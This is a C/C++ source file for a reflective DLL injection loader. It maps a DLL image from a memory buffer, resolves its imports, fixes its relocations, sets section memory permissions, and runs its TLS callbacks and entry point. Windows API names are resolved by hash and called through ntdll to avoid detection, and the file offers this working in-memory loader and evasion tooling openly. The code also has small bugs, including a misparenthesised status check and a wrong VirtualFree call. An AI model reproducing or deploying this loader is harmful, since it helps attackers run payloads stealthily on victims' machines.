#include "rdi.h"

int ParsePEHeaders(PDLLMODULE dll_module) {

	dll_module->dos_header = (PIMAGE_DOS_HEADER)dll_module->dll_bytes; 
	dll_module->nt_headers = (PIMAGE_NT_HEADERS)((ULONGLONG)dll_module->dll_bytes + dll_module->dos_header->e_lfanew);
	dll_module->dll_image_size = dll_module->nt_headers->OptionalHeader.SizeOfImage;

	return 0;
}


int MapPeHeaders(PDLLMODULE dll_module) {
	NTSTATUS status;

	PIC_STRING(NtAllocateVirtualMemory, "NtAllocateVirtualMemory");
	DWORD NtAllocateVirtualMemory_HASH = HASH_STR((PCHAR)NtAllocateVirtualMemory);

	PIC_WSTRING(NTDLL, L"ntdll.dll");

	PVOID pNtdll = hlpGetModuleHandle(NTDLL);
	NtAllocateVirtualMemory_t  pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddresshash(pNtdll, NtAllocateVirtualMemory_HASH);
	if (status = pNtAllocateVirtualMemory((HANDLE)-1, &dll_module->dll_base, 0, &dll_module->dll_image_size, MEM_COMMIT, PAGE_READWRITE) != 0)
		return 1;

	memcpy(dll_module->dll_base, dll_module->dll_bytes, dll_module->nt_headers->OptionalHeader.SizeOfHeaders);

	return 0;
}

int MapPeSections(PDLLMODULE dll_module) {

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(dll_module->nt_headers);
	for (size_t i = 0; i < dll_module->nt_headers->FileHeader.NumberOfSections; i++) {
		PVOID section_destination = (LPVOID)((ULONGLONG)dll_module->dll_base + (ULONGLONG)section->VirtualAddress);
		PVOID section_bytes = (LPVOID)((ULONGLONG)dll_module->dll_bytes + (ULONGLONG)section->PointerToRawData);
		memcpy(section_destination, section_bytes, section->SizeOfRawData);
		section++;
	}

	section = NULL;
	return 0;
}

int FixRelocationTable(PDLLMODULE dll_module) {

	PIC_WSTRING(NTDLL, L"ntdll.dll");
	PVOID pNtdll = hlpGetModuleHandle(NTDLL);

	PIC_STRING(NtReadVirtualMemory, "NtReadVirtualMemory");
	DWORD NtReadVirtualMemory_HASH = HASH_STR((PCHAR)NtReadVirtualMemory);

	NtReadVirtualMemory_t pNtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddresshash(pNtdll, NtReadVirtualMemory_HASH);

	IMAGE_DATA_DIRECTORY relocations = dll_module->nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (relocations.Size == 0) { // no relocation table
		return 0;
	}

	ULONGLONG relocation_table = relocations.VirtualAddress + (ULONGLONG)dll_module->dll_base;

	ULONGLONG delta_image_base = (ULONGLONG)dll_module->dll_base - (ULONGLONG)dll_module->nt_headers->OptionalHeader.ImageBase;
	if (delta_image_base == 0) { // no relocation needed
		return 0;
	}

	ULONGLONG offset = relocations.VirtualAddress;
	while (offset < relocations.VirtualAddress + relocations.Size) {
		PIMAGE_BASE_RELOCATION relocation_block = (PIMAGE_BASE_RELOCATION)((ULONGLONG)dll_module->dll_base + offset);
		ULONG relocations_count = (relocation_block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_block + 1);

		for (int i = 0; i < relocations_count; i++) {
		
			switch (relocation_entries[i].Type) { //only 64bit relocation now
				case (IMAGE_REL_BASED_ABSOLUTE):
					continue;
				case (IMAGE_REL_BASED_DIR64): // 64bit relocation
					*(ULONG_PTR*)((ULONGLONG)dll_module->dll_base + relocation_block->VirtualAddress + relocation_entries[i].Offset) += (ULONG_PTR)delta_image_base;
			}

		}
		offset += relocation_block->SizeOfBlock;
	}

	return 0;
}


int ResolveIAT(PDLLMODULE dll_module) {

	PIC_WSTRING(NTDLL, L"ntdll.dll");
	PVOID pNtdll = hlpGetModuleHandle(NTDLL);
	PIC_STRING(RtlInitUnicodeString, "RtlInitUnicodeString");
	DWORD RtlInitUnicodeString_HASH = HASH_STR((PCHAR)RtlInitUnicodeString);

	PIC_STRING(RtlMultiByteToUnicodeN, "RtlMultiByteToUnicodeN");
	DWORD RtlMultiByteToUnicodeN_HASH = HASH_STR((PCHAR)RtlMultiByteToUnicodeN);

	PIC_STRING(LdrLoadDll, "LdrLoadDll");
	DWORD LdrLoadDll_HASH = HASH_STR((PCHAR)LdrLoadDll);

	RtlInitUnicodeString_t pRtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddresshash(pNtdll, RtlInitUnicodeString_HASH);
	RtlMultiByteToUnicodeN_t pRtlMultiByteToUnicodeN = (RtlMultiByteToUnicodeN_t)GetProcAddresshash(pNtdll, RtlMultiByteToUnicodeN_HASH);
	LdrLoadDll_t pLdrLoadDll = (LdrLoadDll_t)GetProcAddresshash(pNtdll, LdrLoadDll_HASH);


	PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
	IMAGE_DATA_DIRECTORY import_directory = dll_module->nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	UNICODE_STRING import_library_name;

	import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(import_directory.VirtualAddress + (ULONGLONG)dll_module->dll_base);
	PVOID current_library = NULL;


	while (import_descriptor->Name != 0) {
		PCHAR module_name = (PCHAR)dll_module->dll_base + import_descriptor->Name;
		WCHAR w_module_name[MAX_PATH];
		ULONG num_converted;
		if (pRtlMultiByteToUnicodeN(w_module_name, sizeof(w_module_name), &num_converted, module_name, sl(module_name) + 1) != 0)
			return 1;

		pRtlInitUnicodeString(&import_library_name, w_module_name);

		if (pLdrLoadDll(NULL, NULL, &import_library_name, &current_library) != 0)
			return 1;

		if (current_library) {
			ANSI_STRING a_string;
			PIMAGE_THUNK_DATA thunk = NULL;
			PIMAGE_THUNK_DATA original_thunk = NULL;

			thunk = (PIMAGE_THUNK_DATA)((ULONGLONG)dll_module->dll_base + import_descriptor->FirstThunk);

			while (thunk->u1.AddressOfData != 0) {
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
					thunk->u1.Ordinal = (ULONGLONG)hlpGetProcAddress((HMODULE)current_library, (PCHAR)((ULONGLONG)dll_module->dll_base + thunk->u1.Function));
				}
				else {
					PIMAGE_IMPORT_BY_NAME function_name = (PIMAGE_IMPORT_BY_NAME)((ULONGLONG)dll_module->dll_base + thunk->u1.AddressOfData);
					DWORD_PTR function_address = (DWORD_PTR)hlpGetProcAddress((HMODULE)current_library, function_name->Name);
					thunk->u1.Function = (ULONGLONG)function_address;
				}
				thunk++;
			}
		}
		import_descriptor++;
	}

	return 0;
}

int PatchMemoryPermission(PDLLMODULE dll_module) {

	PIC_WSTRING(NTDLL, L"ntdll.dll");
	PVOID pNtdll = hlpGetModuleHandle(NTDLL);

	PIC_STRING(NtProtectVirtualMemory, "NtProtectVirtualMemory");
	DWORD NtProtectVirtualMemory_HASH = HASH_STR((PCHAR)NtProtectVirtualMemory);

	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddresshash(pNtdll, NtProtectVirtualMemory_HASH);

	PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(dll_module->nt_headers);

	for (int i = 0; i < dll_module->nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
		if (section_header->SizeOfRawData) {
			DWORD executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
			DWORD readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
			DWORD writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
			DWORD protect = 0;

			if (!executable && !readable && !writeable)
				protect = PAGE_NOACCESS;
			else if (!executable && !readable && writeable)
				protect = PAGE_WRITECOPY;
			else if (!executable && readable && !writeable)
				protect = PAGE_READONLY;
			else if (!executable && readable && writeable)
				protect = PAGE_READWRITE;
			else if (executable && !readable && !writeable)
				protect = PAGE_EXECUTE;
			else if (executable && !readable && writeable)
				protect = PAGE_EXECUTE_WRITECOPY;
			else if (executable && readable && !writeable)
				protect = PAGE_EXECUTE_READ;
			else if (executable && readable && writeable)
				protect = PAGE_EXECUTE_READWRITE;

			if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
				protect |= PAGE_NOCACHE;

			size_t size = section_header->SizeOfRawData;
			PVOID address = (PCHAR)dll_module->dll_base + section_header->VirtualAddress;
			if (pNtProtectVirtualMemory(NtCurrentProcess(), &address, (PULONG)&size, protect, &protect) != 0)
				return 1;
		}
	}

	return 0;
}

int ExecuteModule(PDLLMODULE dll_module) {
	PIC_WSTRING(NTDLL, L"ntdll.dll");
	PVOID pNtdll = hlpGetModuleHandle(NTDLL);

	PIC_STRING(NtFlushInstructionCache, "NtFlushInstructionCache");
	DWORD NtFlushInstructionCache_HASH = HASH_STR((PCHAR)NtFlushInstructionCache);
	NtFlushInstructionCache_t pNtFlushInstructionCache = (NtFlushInstructionCache_t)(GetProcAddresshash(pNtdll, NtFlushInstructionCache_HASH));

	pNtFlushInstructionCache((HANDLE)NtCurrentProcess(), NULL, 0);

	// executing TLS callbacks. 
	PIMAGE_TLS_DIRECTORY tls_entry;
	PIMAGE_TLS_CALLBACK *ppCallback;

	IMAGE_DATA_DIRECTORY tls_data_dir = dll_module->nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (tls_data_dir.Size) {
		tls_entry = (PIMAGE_TLS_DIRECTORY)((ULONGLONG)dll_module->dll_base + tls_data_dir.VirtualAddress);
		ppCallback = (PIMAGE_TLS_CALLBACK*)(tls_entry->AddressOfCallBacks);

		while (*ppCallback) {
			(*ppCallback)((LPVOID)dll_module->dll_base, DLL_PROCESS_ATTACH, NULL);
			ppCallback++;
		}
	}


	//if dll has no entry point. 
	if (dll_module->nt_headers->OptionalHeader.AddressOfEntryPoint == 0) {
		return 0;
	}

	DLLEntry dllEntry = (DLLEntry)((DWORD_PTR)dll_module->dll_base + dll_module->nt_headers->OptionalHeader.AddressOfEntryPoint);
	(*dllEntry)((HINSTANCE)dll_module->dll_base, DLL_PROCESS_ATTACH, 0);

	VirtualFree(&dll_module->dll_base, (size_t)&dll_module->dll_image_size, MEM_RELEASE);

	return 0;

}

int ReflectiveDLLInjection(std::vector<char> *dllBuffer) {

	PIC_WSTRING(KERNEL32, L"KERNEL32.DLL");
	PIC_STRING(HeapAlloc_function, "HeapAlloc");
	HMODULE hKernel32 = hlpGetModuleHandle(KERNEL32);
	HEAPALLOC pHeapAlloc = (HEAPALLOC)hlpGetProcAddress(hKernel32, (PCHAR)HeapAlloc_function);

	PDLLMODULE dll_module =  (PDLLMODULE)pHeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DLLMODULE));

	dll_module->dll_bytes = dllBuffer->data();

	ParsePEHeaders(dll_module);

	MapPeHeaders(dll_module);

	MapPeSections(dll_module);

	ResolveIAT(dll_module);

	FixRelocationTable(dll_module);

	PatchMemoryPermission(dll_module);

	ExecuteModule(dll_module);
	
	return 0;
}
